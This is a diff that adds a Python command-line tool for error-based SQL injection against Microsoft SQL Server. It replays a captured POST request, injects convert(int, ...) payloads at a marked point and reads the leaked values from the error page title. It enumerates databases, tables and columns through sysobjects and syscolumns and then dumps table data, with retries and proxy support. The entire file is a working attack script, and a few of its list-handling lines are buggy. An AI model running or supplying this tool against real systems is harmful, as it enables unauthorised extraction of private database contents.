@@ -1,0 +1,258 @@
+#!/usr/bin/env python3
+
+from urllib.parse import quote_plus as urlenc
+from bs4 import BeautifulSoup as bs
+import requests
+from time import sleep
+import argparse
+import sys
+
+retry = 3
+wait_sec = 0
+err_wait = 1
+
+
+def gen_header(source):
+    lines = source.split('\n')
+
+    method, path, _ = lines[0].split(' ')
+    host, *port = lines[1].split(' ', 1)[1].split(':')
+    port = port or [80]
+    url = f"http://{host}:{port[0]}{path}"
+
+    # temporary
+    if not method == 'POST':
+        print('error: now only supports POST', file=sys.stderr)
+        exit(1)
+
+    header = {}
+    for line in lines[2:]:
+        splitted = line.split(':', 1)
+        splitted[1] = splitted[1].split(' ', 1)[1]
+        if splitted[0] != 'Connection':
+            header[splitted[0]] = splitted[1]
+
+    return url, method, header
+
+
+def gen_payload(source):
+    result = source.split('^PAYLOAD^')
+    result[0] += left
+    result[1] = right + result[1]
+
+    return result
+
+
+def return_contents(r):
+    # config here
+    contents = bs(r.text, 'html.parser')
+    return contents.title.string.split("'")[1]
+
+
+def retr_database(ses, url, header, payload):
+    base = ["convert(int,DB_NAME(", "))"]
+    print('databases:')
+    r = ses.post(url, headers=header,
+                 data=payload[0] + urlenc(base[0] + base[1]) + payload[1])
+    print(f"curent: {return_contents(r)}")
+
+    databases = []
+    i = 0
+    while True:
+        for _ in range(retry):
+            try:
+                r = ses.post(url, headers=header, data=payload[0] +
+                             urlenc(base[0] + str(i) + base[1]) + payload[1])
+                result = return_contents(r)
+                if result not in databases:
+                    databases.append(result)
+                print(f"{i}: {result}")
+            except:
+                sleep(err_wait)
+            else:
+                break
+        else:
+            break
+        sleep(wait_sec)
+        i += 1
+
+    print()
+    print(','.join(databases))
+
+
+def retr_loop(ses, url, header, payload1, payload2):
+    result = []
+    i = 0
+    while True:
+        for _ in range(retry):
+            try:
+                not_in = ','.join([f"'{elem}'" for elem in result]) or "''"
+                r = ses.post(url, headers=header,
+                             data=payload1 + urlenc(not_in) + payload2)
+                content = return_contents(r)
+                result.append(content)
+                print(f"{i}: {content}")
+            except:
+                sleep(err_wait)
+            else:
+                break
+        else:
+            break
+        sleep(wait_sec)
+        i += 1
+
+    return result
+
+
+def retr_tables(ses, url, header, payload, databases):
+    print('tables:')
+
+    base = ["convert(int, (SELECT TOP 1 name FROM ",
+            "..sysobjects WHERE xtype = 'U' AND name not in (", ")))"]
+
+    tables = {}
+    for db in databases:
+        print(f"{db}:")
+        payload1 = payload[0] + urlenc(base[0] + db + base[1])
+        payload2 = urlenc(base[2]) + payload[1]
+        tables[db] = retr_loop(ses, url, header, payload1, payload2)
+
+        print()
+        print(','.join(tables[db]))
+        print()
+
+
+def retr_columns(ses, url, header, payload, databases, tables):
+    print('columns:')
+
+    base = ["convert(int, (SELECT TOP 1 ", "..syscolumns.name FROM ",
+            "..syscolumns, ", "..sysobjects WHERE ",
+            "..syscolumns.id=", "..sysobjects.id AND ", "..sysobjects.name='",
+            "' AND ", "..syscolumns.name not in (", ")))"]
+
+    columns = {}
+    for db, tb in zip(databases, tables):
+        print(f"{db}:")
+        columns[db] = {}
+        print(f"*{tb}:")
+        payload1 = payload[0] + urlenc(base[0] + db + base[1] + db + base[2] + db +
+                                       base[3] + db + base[4] + db + base[5] + db +
+                                       base[6] + tb + base[7] + db + base[8])
+        payload2 = urlenc(base[9]) + payload[1]
+
+        columns[db][tb] = retr_loop(ses, url, header, payload1, payload2)
+
+        print()
+        print(','.join(columns[db][tb]))
+        print()
+
+
+def retr_data(ses, url, header, payload, databases, tables, columns):
+    print('data:')
+
+    base = ["convert(int, (SELECT TOP 1 ", " FROM ",
+            "..", " WHERE ", " not in (", ")))"]
+
+    data = {}
+    for db, tb, cl in zip(databases, tables, columns):
+        print(f"{db}:")
+        data[db] = {}
+        print(f"*{tb}:")
+        data[db][tb] = {}
+        print(f"**{cl}:")
+        payload1 = payload[0] + urlenc(base[0] + cl + base[1] +
+                                       db + base[2] + tb + base[3] + cl + base[4])
+        payload2 = urlenc(base[5]) + payload[1]
+
+        data[db][tb][cl] = retr_loop(ses, url, header, payload1, payload2)
+
+        print()
+        print(','.join(data[db][tb]))
+        print()
+
+
+def retr_args(raw_args):
+    result = []
+    for arg in raw_args.split(','):
+        elem, *num = arg.split('/')
+        num = num or [1]
+        result += [elem] * int(num[0])
+
+    return result
+
+
+def main():
+    input = open(args.request, mode='r').read().strip()
+    raw_header, raw_payload = input.split('\n\n', 1)
+
+    url, method, header = gen_header(raw_header)
+    payload = gen_payload(raw_payload)
+
+    with requests.Session() as session:
+        if method == 'POST':
+            if args.proxy:
+                session.proxies.update({args.proxy.split(':')[0]: args.proxy})
+
+            if args.database is None and args.table is None and args.column is None:
+                retr_database(session, url, header, payload)
+
+            elif args.database and args.table is None and args.column is None:
+                databases = retr_args(args.database)
+                retr_tables(session, url, header, payload, databases)
+
+            elif args.database and args.table and args.column is None:
+                databases = retr_args(args.database)
+                tables = retr_args(args.table)
+                if len(databases) != len(tables):
+                    if len(databases) == 1:
+                        databases = databases[0] * len(tables)
+                    elif len(tables) == 1:
+                        tables = tables[0] * len(databases)
+                    else:
+                        print('error: argument length is different',
+                              file=sys.stderr)
+                        exit(1)
+                retr_columns(session, url, header,
+                             payload, databases, tables)
+
+            elif args.database and args.table and args.column:
+                databases = retr_args(args.database)
+                tables = retr_args(args.table)
+                columns = retr_args(args.column)
+                if len(databases) != len(tables) or len(databases) != len(columns):
+                    if len(databases) == 1:
+                        databases = [databases[0]] * max(len(tables), len(columns))
+                    if len(tables) == 1:
+                        tables = [tables[0]] * max(len(databases), len(columns))
+                    if len(columns) == 1:
+                        columns = [columns[0]] * max(len(databases), len(tables))
+                    if len(databases) != len(tables) or len(databases) != len(columns):
+                        print('error: argument length is different', file=sys.stderr)
+                        exit(1)
+                retr_data(session, url, header,
+                          payload, databases, tables, columns)
+            else:
+                print('error: invalid arguments', file=sys.stderr)
+                exit(1)
+
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser()
+
+    parser.add_argument('request', help='http request file')
+    parser.add_argument(
+        '-l', '--left', help='left padding argument', required=True)
+    parser.add_argument(
+        '-r', '--right', help='right padding argument', required=True)
+    parser.add_argument(
+        '-d', '--database', help='database from which you want to dump tables (comma separate (arg[/num][arg[/num]...],))')
+    parser.add_argument(
+        '-t', '--table', help='table from which you want to dump columns (comma separate (arg[/num][arg[/num]...],))')
+    parser.add_argument(
+        '-c', '--column', help='column from which you want to dump data (comma separate (arg[/num][arg[/num]...],))')
+    parser.add_argument('-p', '--proxy', help='http or socks5 proxy')
+
+    args = parser.parse_args()
+    left = urlenc(args.left)
+    right = urlenc(args.right)
+    main()
